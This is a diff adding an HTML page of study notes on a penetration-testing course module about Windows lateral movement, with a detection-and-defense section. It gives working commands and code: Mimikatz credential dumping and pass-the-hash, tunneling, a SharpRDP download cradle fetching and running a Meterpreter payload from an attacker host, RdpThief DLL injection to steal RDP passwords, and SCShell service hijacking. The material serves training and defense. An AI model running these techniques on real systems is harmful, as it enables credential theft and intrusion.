@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 17 — Windows Lateral Movement (RDP abuse, PsExec theory, fileless SCM) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 17 — Windows Lateral Movement (RDP abuse, PsExec theory, fileless SCM)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<h2>Objective</h2>
+<p>Initial access is only step one — the post-exploitation goal is to compromise more of the org's assets (more privileged access, or access to confidential data), dictated by the test's goals. This module covers Windows lateral-movement techniques that <strong>do not rely on software vulnerabilities</strong>: they reuse stolen credentials (NTLM hashes or Kerberos tickets) and mostly require local administrator access on the target. The known non-vuln technique families are PsExec, WMI, DCOM, and PSRemoting — some need clear-text credentials, others only a hash. Module path: RDP abuse (standard, pass-the-hash, reverse proxying, command-execution, credential theft) → PsExec theory → a stealthier fileless variant. Techniques apply equally to workstations and servers, and each offers some element of stealth.</p>
+<h2>Target surface</h2>
+<ul>
+<li><strong>Lab domain:</strong> <code>corp1</code>, with domain controller <code>dc01</code>, Windows 10 client (attacked via RDP as <code>dave</code>), and server <code>appsrv01</code> (destination of lateral movement).</li>
+<li><strong>Attacker hosts:</strong> Kali (<code>192.168.119.120</code>-style addressing in listings) and the Windows 10 client as a pivot/launch point.</li>
+<li><strong>Key lab facts:</strong> Mimikatz available at <code>C:\Tools\mimikatz.exe</code>; SharpRDP pre-compiled in <code>C:\Tools</code>; the RdpThief DLL is pre-compiled on <code>appsrv01</code> at <code>C:\Tools\RdpThief.dll</code>; the module's reverse-proxy lab deliberately has <strong>no NAT/firewall</strong> — reverse tunneling is used to practice the concept.</li>
+<li>Credentials referenced in listings are generic lab values (e.g. <code>corp1\dave</code> / <code>corp1\admin</code> with a trivial lab password) — treated as [REDACTED]; the NTLM hash for <code>dave</code> shown in output is a lab artifact, not a real credential.</li>
+</ul>
+<h2>Techniques</h2>
+<h3>1. Lateral movement with RDP (interactive logins)</h3>
+<p>RDP is a multichannel Microsoft protocol for Terminal Server ↔ client communication, and since it's how admins normally work, RDP traffic <strong>blends in with normal network usage</strong> — a stealth advantage. If we hold <em>clear-text</em> credentials for a domain user who is a local admin on the target, we simply connect with <code>mstsc.exe</code> (demo: from the Windows 10 client, <code>mstsc</code> to <code>appsrv01</code> as <code>dave</code>).</p>
+<p>Mechanics worth remembering:</p>
+<ul>
+<li>RDP requires <strong>clear-text credentials</strong> (interactive logons can't be done with a hash).</li>
+<li>An RDP connection <strong>disconnects any existing session</strong>; the <code>/admin</code> flag connects to the admin session and doesn't disconnect the current user when you log in as the same user.</li>
+<li>During the session, <strong>NTLM hashes reside in LSASS memory</strong> for its duration; a disconnect (vs. proper logout) leaves them there — compromising a well-used jump server yields every cached credential.</li>
+</ul>
+<p>The lab demo dumps them with Mimikatz from an elevated console:</p>
+<pre><code class="language-text">mimikatz # privilege::debug
+mimikatz # !+                                  # load mimidrv driver
+mimikatz # !processprotect /process:lsass.exe /remove   # strip LSA protection
+mimikatz # sekurlsa::logonpasswords
+# → Session: RemoteInteractive, User: dave, Domain: corp1, NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+</code></pre>
+<h3>2. Restricted admin mode &amp; RDP pass-the-hash</h3>
+<p><strong>Restricted admin mode</strong> (Microsoft's mitigation for exactly the above) makes RDP perform a <em>network</em> login: no clear-text credentials required, none stored in memory — at the cost of disabling single sign-on. It's off by default, controlled by <code>DisableRestrictedAdmin</code> under <code>HKLM:\System\CurrentControlSet\Control\Lsa</code>.</p>
+<p>Two-way payoff for attackers:</p>
+<ol>
+<li><strong>Defensive side:</strong> with <code>/restrictedadmin</code>, <code>mstsc</code> authenticates with the <em>current</em> logon session (no password typed), and Mimikatz on the target then finds <strong>no NTLM hash</strong> in LSASS — nothing cached.</li>
+<li><strong>Offensive side:</strong> a network login means the session can be authenticated <strong>with only an NTLM hash</strong>. Mimikatz launches <code>mstsc /restrictedadmin</code> in another user's context:</li>
+</ol>
+<pre><code class="language-text">mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:&quot;mstsc.exe /restrictedadmin&quot;
+</code></pre>
+<p>The resulting <code>mstsc</code> window connects straight into <code>appsrv01</code> as <code>admin</code> — RDP lateral movement with a hash only. (Cosmetic quirk: the dialog still labels the connection as <code>dave</code> — an artifact of the pass-the-hash.)</p>
+<p><strong>If restricted admin mode is disabled on the target:</strong> enable it remotely first. Pass the hash into a PowerShell process (<code>sekurlsa::pth /run:powershell</code>), then <code>Enter-PSSession -Computer appsrv01</code> and create the value:</p>
+<pre><code class="language-powershell">New-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot; -Name DisableRestrictedAdmin -Value 0
+</code></pre>
+<p>The setting applies instantly and the RDP pass-the-hash works again. To <em>disable</em> it (as the lab does for the demo): <code>Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin</code>, which makes subsequent connections fail until re-enabled.</p>
+<p><strong>From Kali directly</strong>, <code>xfreerdp</code> supports restricted-admin pass-the-hash (target port 3389 must be reachable):</p>
+<pre><code class="language-bash">xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
+</code></pre>
+<h3>3. Reverse RDP proxying with Metasploit (reaching NAT'd hosts)</h3>
+<p>GUI access to a compromised machine simplifies post-exploitation, but edge firewalls/NAT block inbound RDP to internal hosts. Fix: <strong>egress tunnel</strong>. From a Meterpreter session on the internal client:</p>
+<ol>
+<li><code>multi/manage/autoroute</code> with <code>set session 1</code> → adds a route to the internal subnet through the session (<code>[+] Route added to subnet 192.168.120.0/255.255.255.0 from host's routing table.</code>).</li>
+<li><code>auxiliary/server/socks4a</code> with <code>set srvhost 127.0.0.1</code>, run as a background job → SOCKS proxy riding the tunnel.</li>
+<li>Point proxychains at it — <code>echo "socks4 127.0.0.1 1080" &gt;&gt; /etc/proxychains.conf</code> — then:</li>
+</ol>
+<pre><code class="language-bash">proxychains rdesktop 192.168.120.10
+</code></pre>
+<p>The RDP session flows out of the compromised host into the internal net. The same route serves any other tool: Nmap for internal scans, Firefox for internal web apps. (Lab note: with no firewall/NAT present, the tunnel isn't strictly required — it's practice for the real-world case.)</p>
+<h3>4. Reverse RDP proxying with Chisel (standalone)</h3>
+<p>Frameworks like Metasploit/Cobalt Strike have autorouting built in; with Empire or Covenant you need a standalone tool. Traditional choice: <code>plink</code> (command-line PuTTY). Modern choice: <strong>Chisel</strong> — Golang TCP tunnel over HTTP secured with SSH, with client and server components creating a SOCKS-compliant proxy.</p>
+<p>Build (on Kali):</p>
+<pre><code class="language-bash">sudo apt install golang
+git clone https://github.com/jpillora/chisel.git &amp;&amp; cd chisel
+go build                                            # Linux server binary
+env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags &quot;-s -w&quot;   # Windows client, symbols stripped
+</code></pre>
+<p>Run — server on Kali, client on the compromised Windows host (transferred via the existing shell):</p>
+<pre><code class="language-bash">./chisel server -p 8080 --socks5                    # SOCKS5 server enabled, listening :8080
+</code></pre>
+<pre><code class="language-text">C:\Tools&gt; chisel.exe client 192.168.119.120:8080 socks   # → proxy listening on 127.0.0.1:1080
+</code></pre>
+<p>Then tunnel RDP the same way: <code>sudo proxychains rdesktop 192.168.120.10</code>. More work than a built-in feature, but gives GUI access where none should be possible. Chisel also supports classic reverse-SSH-tunnel syntax via <code>-reverse</code> on the server side. (0xdf variant noted in the course.)</p>
+<h3>5. RDP as a console — SharpRDP (no GUI, no tunnel)</h3>
+<p><code>mstsc.exe</code> is a GUI wrapper over the <strong>terminal services library <code>mstscax.dll</code></strong>, which exposes COM interfaces to scripts and compiled code. <strong>SharpRDP</strong> (C#, MDSec) uses the non-scriptable interfaces to authenticate exactly like <code>mstsc</code>, then executes commands through <strong>SendKeys</strong> — so no GUI access and no reverse tunnel needed:</p>
+<pre><code class="language-text">C:\Tools&gt; SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=[REDACTED]
+[+] Connected to: appsrv01
+[+] User not currently logged in, creating new session
+[+] Execution priv type: non-elevated
+[+] Executing notepad
+</code></pre>
+<p>Real payload: a PowerShell download cradle that pulls and runs a Meterpreter executable:</p>
+<pre><code class="language-text">C:\Tools&gt; sharprdp.exe computername=appsrv01 command=&quot;powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe&quot; username=corp1\dave password=[REDACTED]
+</code></pre>
+<p>→ reverse Meterpreter session on Kali (handler on 443). Command-line lateral movement over RDP with neither GUI nor tunneling. Note execution is <strong>non-elevated</strong>.</p>
+<h3>6. Stealing clear-text credentials from RDP (API hooking with RdpThief)</h3>
+<p>A generic keylogger captures RDP credentials but drowns you in output; a targeted hook is cleaner. Concept: <strong>API hooking</strong> — overwrite a function's first instructions with a jump to custom code that (a) copies the input buffer contents back to us, or (b) rewrites them, then continues execution unaltered. (Microsoft's <strong>Detours</strong> library does this; the course's earlier Frida module was a related monitoring technique.)</p>
+<p>MDSec research identified the APIs handling RDP username, password, and domain: <code>CredIsMarshaledCredentialW</code>, <code>CryptProtectMemory</code>, and <code>SspiPrepareForCredRead</code>. <strong>RdpThief</strong> hooks these with Detours, copies the values to a file, and lets the original API proceed. It's an unmanaged DLL that must be injected into <code>mstsc.exe</code> <strong>before</strong> the user types credentials — the course reuses its C# DLL-injection tradecraft (OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread on <code>LoadLibraryA</code>), changing only the target process and DLL:</p>
+<pre><code class="language-csharp">String dllName = &quot;C:\\Tools\\RdpThief.dll&quot;;
+Process[] mstscProc = Process.GetProcessesByName(&quot;mstsc&quot;);
+int pid = mstscProc[0].Id;
+IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+// ... VirtualAllocEx, WriteProcessMemory(dll path), CreateRemoteThread(LoadLibraryA)
+</code></pre>
+<p>Then: start <code>mstsc.exe</code>, run <code>Inject.exe</code>, let the user log in (demo: <code>mstsc</code> → <code>dc01</code> as <code>admin</code>), read the drop file:</p>
+<pre><code class="language-text">C:\Tools&gt; type C:\Users\dave\AppData\Local\Temp\6\data.bin
+S e r v e r :   d c 0 1   U s e r n a m e :   c o r p 1 \ a d m i n   P a s s w o r d :   l a b
+</code></pre>
+<p>(output path's username is resolved dynamically; trailing numbered dir is the session ID — lab password value shown only as output shape, [REDACTED]).</p>
+<p>Timing problem solved with a one-second polling loop: <code>while(true)</code> over <code>Process.GetProcessesByName("mstsc")</code>, injecting into <strong>every</strong> new instance, <code>Thread.Sleep(1000)</code> between iterations — so the DLL is always in place before credentials are typed.</p>
+<h3>7. PsExec theory (what we're evading)</h3>
+<p>PsExec (Sysinternals): authenticates to <strong>SMB</strong> on the target, accesses the <strong>DCE/RPC</strong> interface, reaches the <strong>service control manager</strong>, creates a <strong>new service</strong>, and executes it — copying the service binary to the target as part of the attack. Every one of those artifacts (written file, new service) is a detection opportunity, which motivates the fileless variant below.</p>
+<h3>8. Fileless lateral movement — the SCShell technique</h3>
+<p>Goal: a PsExec variant that <strong>neither writes a file to disk nor creates a new service</strong>. Two tasks: authenticate to the target, then execute code.</p>
+<ul>
+<li><strong>Authentication</strong> is handled by the unmanaged <code>OpenSCManagerW</code> API (machine name, database name — <code>null</code> for default — and desired access; <code>SC_MANAGER_ALL_ACCESS</code> = <code>0xF003F</code>). It executes <strong>in the context of the calling thread's access token — no password needed</strong>, and consequently pass-the-hash works trivially (launch the tool via <code>sekurlsa::pth</code>).</li>
+<li><strong>Execution</strong> avoids <code>CreateServiceA</code> entirely: <code>OpenServiceW</code> opens an <strong>existing</strong> service (candidate: <code>SensorService</code> — present by default on Windows 10 and Server 2016/2019, not vital, not auto-start; <code>SERVICE_ALL_ACCESS</code> = <code>0xF01FF</code>), then <code>ChangeServiceConfigA</code> <strong>re-points the service binary</strong> at our payload (only relevant args: <code>dwServiceType = SERVICE_NO_CHANGE (0xffffffff)</code>, <code>dwStartType = SERVICE_DEMAND_START (0x3)</code>, <code>dwErrorControl = 0</code>, <code>lpBinaryPathName = payload</code>; rest <code>null</code>), then <code>StartServiceA(hService, 0, null)</code> fires it.</li>
+</ul>
+<p>PoC sets the binary to <code>notepad.exe</code>; executed as <code>dave</code>, Notepad appears on <code>appsrv01</code> <strong>running as SYSTEM</strong> (the SCM kills it shortly after since it's not a real service executable — code execution achieved regardless). Because we control the binary path, we can point it at a <strong>PowerShell download cradle</strong> so nothing touches disk; with application whitelisting in place this needs a bypass (InstallUtil, XSL transform, etc.).</p>
+<p><strong>SCShell</strong> (C#, C, and Python implementations) weaponizes this: it also queries the original binary path via <code>QueryServiceConfig</code> and <strong>restores the service binary afterward</strong>, further aiding evasion. Kali-side use with only an NTLM hash:</p>
+<pre><code class="language-bash">python3 scshell.py -hashes :&lt;ntlm&gt; &lt;domain&gt;/&lt;user&gt;@appsrv01   # shape per tool docs
+</code></pre>
+<p>Key P/Invoke signatures (all <code>advapi32.dll</code>):</p>
+<pre><code class="language-csharp">[DllImport(&quot;advapi32.dll&quot;, EntryPoint=&quot;OpenSCManagerW&quot;, ExactSpelling=true, CharSet=CharSet.Unicode, SetLastError=true)]
+public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
+
+[DllImport(&quot;advapi32.dll&quot;, SetLastError=true, CharSet=CharSet.Auto)]
+static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+
+[DllImport(&quot;advapi32.dll&quot;, EntryPoint=&quot;ChangeServiceConfig&quot;)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
+
+[DllImport(&quot;advapi32&quot;, SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
+</code></pre>
+<h2>Lab exercises (module checkpoints)</h2>
+<ol>
+<li>From the Windows 10 client as <code>offsec</code>, Mimikatz pass-the-hash an <code>mstsc /restrictedadmin</code> process as <code>dave</code>.</li>
+<li>Disable restricted admin mode, then re-enable it through PowerShell remoting as part of the attack.</li>
+<li>Configure a Metasploit reverse tunnel (autoroute + SOCKS) and get RDP on the Windows 10 client.</li>
+<li>Do the same with a compiled Chisel client/server pair.</li>
+<li>Get a reverse Meterpreter shell through SharpRDP.</li>
+<li>Rerun the RdpThief attack and capture clear-text credentials.</li>
+<li>Build the fileless PoC that runs Notepad on <code>appsrv01</code> as SYSTEM.</li>
+<li>Use the Python SCShell implementation to execute on <code>appsrv01</code> from Kali with only <code>dave</code>'s NTLM hash.</li>
+</ol>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>RDP lateral movement</strong> is high-value precisely because it blends in — detection hinges on <em>context</em>, not the traffic itself: correlate RDP logons (especially RemoteInteractive session types) with which accounts legitimately RDP where; alert on unusual source→target pairs and off-hours interactive logons.</li>
+<li><strong>Credential caching is the root exposure</strong> of section 1: restricted admin mode (network logon, nothing cached) plus credential-guard-style LSA protection directly shrink the dumpable surface — Mimikatz had to strip <code>lsass.exe</code> process protection before <code>sekurlsa::logonpasswords</code> worked.</li>
+<li><strong>Restricted admin mode trade-off:</strong> it stops hash theft on the target but creates an RDP pass-the-hash path — defenders must weigh enabling it; if enabled, watch for <code>DisableRestrictedAdmin</code> registry modifications (both value creation and deletion), which is exactly the attacker's enable/disable cycle.</li>
+<li><strong>Reverse tunnels:</strong> autoroute/SOCKS and Chisel ride outbound egress (HTTP/WebSocket on 8080) — egress filtering, blocking workstation→workstation 3389, and alerting on SSH/HTTP-tunnel patterns matter more than inbound blocking. NLA/credentials failing through a SOCKS chain ("Failed to initialize NLA…") is a hint of proxied RDP in logs.</li>
+<li><strong>SharpRDP</strong> authenticates like real <code>mstsc</code> but drives the session with <code>SendKeys</code> — no tunnel, no GUI; detection is on the logon + immediate suspicious process spawning (download cradles) under RDP sessions, and on non-elevated process trees.</li>
+<li><strong>RdpThief / API hooking:</strong> an unmanaged DLL injected into <code>mstsc.exe</code> via remote-thread + <code>LoadLibraryA</code> — classic injection telemetry (cross-process OpenProcess with <code>0x001F0FFF</code>, <code>CreateRemoteThread</code>), plus the <code>data.bin</code> drop in the user's temp dir. Hook-based tools overwrite API prologues; integrity monitoring of <code>mstscax.dll</code>-adjacent API usage is hard at the host level, so the injection chain is the practical alert.</li>
+<li><strong>Fileless SCM abuse (SCShell):</strong> no new service is created and no file lands on disk, but <code>ChangeServiceConfigA</code> against an existing service (e.g. <code>SensorService</code>) <strong>modifies service configuration</strong> — monitor Event ID 7040 / service-configuration changes and restore operations; SCShell's own restoration step is itself a change-event sequence (modify → start → restore) that stands out. Remote SCM access from workstations is abnormal; restrict which accounts can remotely reconfigure services.</li>
+<li>Cross-cutting: nearly every technique here runs with <strong>local admin rights and reuses NTLM</strong> — the systemic mitigations are limiting local-admin membership across hosts (no credential reuse ladder), NTLM reduction/Kerberos-only auth, and LSASS protection, which together collapse most of this module's attack surface.</li>
+</ul>
+<h2>Extraction notes</h2>
+<ul>
+<li>Source is clean course text (not ASR); commands and listings above are faithful to the module, lightly condensed. A few source typos carried into the text (e.g. "Funciton prototype of WinExec") were not reproduced.</li>
+<li>Figure-only content (RDP dialog screenshots, services manager) is described inline where it matters.</li>
+<li>Lab passwords appear in the module's listings; reproduced here only as [REDACTED]/shape. NTLM hashes quoted are the module's own lab artifacts.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
